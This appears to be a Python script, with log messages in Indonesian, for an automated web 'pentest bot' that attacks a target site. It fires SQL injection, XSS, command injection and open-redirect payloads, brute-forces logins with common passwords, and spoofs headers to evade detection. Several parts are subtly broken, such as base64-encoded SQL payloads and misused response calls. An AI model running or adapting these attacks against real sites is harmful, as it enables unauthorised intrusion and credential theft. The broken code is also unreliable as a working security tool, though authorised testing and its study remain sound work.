import requests
import asyncio
import aiohttp
import random
import time
import base64
import validators
from urllib.parse import quote_plus
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

class WebPenTestBot:
    def __init__(self, base_url, proxy=None, login_url=None, credentials=None):
        if not validators.url(base_url):
            raise ValueError("URL yang diberikan tidak valid")
        self.base_url = base_url
        self.proxy = proxy
        self.login_url = login_url
        self.credentials = credentials
        self.session = aiohttp.ClientSession()
        self.log_file = 'pentest_results.log'
        if self.login_url and self.credentials:
            self.login()

    def log(self, message, color=Colors.RESET, extra_info=""):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, 'a') as log:
            log.write(f"{timestamp} - {message} {extra_info}\n")
        print(f"{color}{message} {extra_info}{Colors.RESET}")

    def obfuscate_payload(self, payload):
        encoded_payload = base64.b64encode(payload.encode()).decode()
        return encoded_payload

    def random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        return random.choice(user_agents)

    def generate_random_headers(self):
        headers = {
            "User-Agent": self.random_user_agent(),
            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }
        return headers

    async def get_html(self, path, retries=3, timeout=5):
        url = self.base_url + path
        attempt = 0
        while attempt < retries:
            try:
                async with self.session.get(url, timeout=timeout, headers=self.generate_random_headers()) as response:
                    response.raise_for_status()
                    return await response.text()
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                attempt += 1
                self.log(f"{Colors.RED}[x] Gagal mengakses {url}, percobaan {attempt} dari {retries}: {str(e)}{Colors.RESET}")
                await asyncio.sleep(random.randint(1, 2))
        return None

    async def test_sql_injection(self, path):
        payloads = [
            "admin' OR '1'='1' -- ",
            "' UNION SELECT null, username, password FROM users --",
            "' OR 1=1 --",
            "admin' OR 'a'='a' --"
        ]
        url = self.base_url + path
        for payload in payloads:
            encoded_payload = self.obfuscate_payload(payload)
            data = {"username": encoded_payload, "password": encoded_payload}
            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                if 'error' in await response.text():
                    self.log(f"{Colors.YELLOW}[!] Eksploitasi SQL Injection berhasil menyebabkan error pada: {url}{Colors.RESET}")
                elif 'Welcome' in await response.text():
                    self.log(f"{Colors.GREEN}[!] Eksploitasi SQL Injection berhasil, akses ke akun admin terbuka: {url}{Colors.RESET}")
                else:
                    self.log(f"{Colors.RED}[x] Tidak ada SQL Injection di {url}{Colors.RESET}")

    async def test_xss(self, path):
        payloads = [
            "<script>alert('XSS Vulnerability')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert(1)>"
        ]
        url = self.base_url + path
        for payload in payloads:
            data = {'input': payload}
            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                if payload in await response.text():
                    self.log(f"{Colors.GREEN}[!] Cross-Site Scripting (XSS) berhasil pada: {url}{Colors.RESET}")
                else:
                    self.log(f"{Colors.RED}[x] Tidak ada XSS di {url}{Colors.RESET}")

    async def test_csrf(self, path):
        url = self.base_url + path
        html = await self.get_html(path)
        if not html:
            self.log(f"{Colors.RED}[x] Tidak dapat memuat halaman untuk CSRF di {url}{Colors.RESET}")
            return

        soup = BeautifulSoup(html, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf_token'})
        if csrf_token:
            self.log(f"{Colors.YELLOW}[!] CSRF Token ditemukan di {url}. Coba eksploitasi dengan payload CSRF.{Colors.RESET}")
        else:
            self.log(f"{Colors.GREEN}[+] Tidak ditemukan CSRF di {url}{Colors.RESET}")

    async def brute_force_login(self, path):
        url = self.base_url + path
        usernames = ['admin', 'user', 'test', 'guest']
        passwords = ['password123', '123456', 'admin', 'password']
        with ThreadPoolExecutor() as executor:
            for username in usernames:
                for password in passwords:
                    executor.submit(self._brute_force_task, url, username, password)

    def _brute_force_task(self, url, username, password):
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data, headers=self.generate_random_headers())
        if 'Welcome' in response.text:
            self.log(f"{Colors.GREEN}[+] Brute Force berhasil login dengan username: {username} dan password: {password}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Gagal login dengan username: {username} dan password: {password}{Colors.RESET}")

    async def cache_poisoning(self, path):
        payload = "username=<script>alert('Cache Poisoning')</script>"
        url = self.base_url + path
        async with self.session.get(url, params={'input': payload}, headers=self.generate_random_headers()) as response:
            if payload in await response.text():
                self.log(f"{Colors.GREEN}[!] Cache Poisoning berhasil pada: {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Tidak ada Cache Poisoning di {url}{Colors.RESET}")

    async def api_security_test(self, path):
        url = self.base_url + path
        headers = self.generate_random_headers()
        async with self.session.get(url, headers=headers) as response:
            if response.status == 200:
                self.log(f"{Colors.GREEN}[+] API Keamanan diuji berhasil pada: {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Pengujian API gagal pada: {url}{Colors.RESET}")

    async def bypass_captcha(self, path):
        url = self.base_url + path
        captcha_response = "dummy_solution"
        data = {"captcha_response": captcha_response}
        async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
            if 'success' in await response.text():
                self.log(f"{Colors.GREEN}[+] CAPTCHA berhasil dilewati di {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.RED}[x] Gagal melewati CAPTCHA di {url}{Colors.RESET}")

    async def test_command_injection(self, path):
        payloads = [
            "; ls",  
            "| dir",  
            "& whoami",  
        ]
        url = self.base_url + path
        for payload in payloads:
            data = {'input': payload}
            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                if 'root' in await response.text() or 'Administrator' in await response.text():
                    self.log(f"{Colors.GREEN}[!] Command Injection berhasil pada: {url}{Colors.RESET}")
                else:
                    self.log(f"{Colors.RED}[x] Tidak ada Command Injection di {url}{Colors.RESET}")

    async def test_open_redirect(self, path):
        payloads = [
            "http://evil.com",
            "https://malicious.com",
            "http://localhost:8080"
        ]
        url = self.base_url + path
        for payload in payloads:
            data = {'redirect_url': payload}
            async with self.session.post(url, data=data, headers=self.generate_random_headers()) as response:
                if response.url != url:
                    self.log(f"{Colors.GREEN}[!] Open Redirect berhasil di {url} menuju: {response.url}{Colors.RESET}")
                else:
                    self.log(f"{Colors.RED}[x] Tidak ada Open Redirect di {url}{Colors.RESET}")

    async def test_insecure_deserialization(self, path):
        url = self.base_url + path
        payload = {"data": "eyJ1c2VyX2lkIjogMSwgImVtYWlsIjogImFkbWluQG1haWwuY29tIn0="}  # Base64 encoded serialized object
        async with self.session.post(url, json=payload, headers=self.generate_random_headers()) as response:
            if "error" in await response.text():
                self.log(f"{Colors.RED}[x] Gagal melakukan uji insecure deserialization di {url}{Colors.RESET}")
            else:
                self.log(f"{Colors.GREEN}[!] Potensi insecure deserialization ditemukan di {url}{Colors.RESET}")

    def configure_selenium(self):
        options = Options()
        options.headless = True
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        return webdriver.Chrome(options=options)

    def run_selenium_test(self):
        driver = self.configure_selenium()
        driver.get(self.base_url)
        try:
            search_box = driver.find_element(By.NAME, "search")
            search_box.send_keys("test")
            search_box.submit()
            self.log(f"{Colors.GREEN}[+] Pengujian dengan Selenium berhasil di {self.base_url}{Colors.RESET}")
        except Exception as e:
            self.log(f"{Colors.RED}[x] Error pengujian Selenium: {str(e)}{Colors.RESET}")
        finally:
            driver.quit()

    async def execute_all_tests(self):
        paths = ['/login', '/admin', '/profile', '/search']  # Ubah dengan path yang relevan
        tasks = []
        for path in paths:
            tasks.append(self.test_sql_injection(path))
            tasks.append(self.test_xss(path))
            tasks.append(self.test_csrf(path))
            tasks.append(self.cache_poisoning(path))
            tasks.append(self.test_command_injection(path))
            tasks.append(self.test_open_redirect(path))
            tasks.append(self.test_insecure_deserialization(path))
        await asyncio.gather(*tasks)

    def login(self):
        if not self.login_url or not self.credentials:
            self.log(f"{Colors.RED}[x] Tidak ada URL login atau kredensial yang disediakan!{Colors.RESET}")
            return

        username, password = self.credentials
        self.log(f"{Colors.BLUE}[+] Melakukan login dengan username {username} dan password {password}{Colors.RESET}")
        data = {'username': username, 'password': password}
        response = requests.post(self.login_url, data=data, headers=self.generate_random_headers())
        if response.status_code == 200 and 'Welcome' in response.text():
            self.log(f"{Colors.GREEN}[+] Login berhasil ke {self.login_url}{Colors.RESET}")
        else:
            self.log(f"{Colors.RED}[x] Login gagal ke {self.login_url}{Colors.RESET}")

    def start_testing(self):
        asyncio.run(self.execute_all_tests())
        self.run_selenium_test()

if __name__ == "__main__":
    # Ubah dengan URL target yang sesuai dan jika diperlukan, kredensial login
    bot = WebPenTestBot(base_url="http://target-website.com", 
                        proxy=None, 
                        login_url="http://target-website.com/login", 
                        credentials=("admin", "password123"))
    bot.start_testing()
